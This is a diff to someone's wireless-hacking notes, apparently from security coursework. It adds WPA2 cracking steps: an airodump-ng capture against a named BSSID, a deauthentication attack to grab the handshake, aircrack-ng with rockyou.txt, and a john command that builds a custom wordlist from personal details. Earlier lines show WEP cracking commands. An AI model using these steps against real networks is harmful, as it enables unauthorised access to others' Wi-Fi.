@@ -30,3 +30,13 @@ aireplay-ng --arpreplay -b 04:5E:A4:72:52:9F wlan0
 keep them both running till the data reaches to 15000
 now we need to crack the wifi:
 aircrack-ng wep_hacking-01.cap
+
+hack wpa2 brute force
+airodump-ng --band abg -c 1 --bssid 08:5A:11:C1:A9:CA wlo1mon -w wpa_hacking
+now do defauthentication attack for short period of time
+WPA handshake: 08:5A:11:C1:A9:CA
+aircrack-ng -w rockyou.txt /home/alihazimeh/Desktop/semsec-websecurity/wpa_hacking-01.cap
+
+crunch, cewel, john the ripper // tools to generate my own wordlist
+generate a file: add some info on separate lines // hasan, achek, 1999
+john --wordlist=keywords.txt --rules --stdout > custom_wordlist.txt
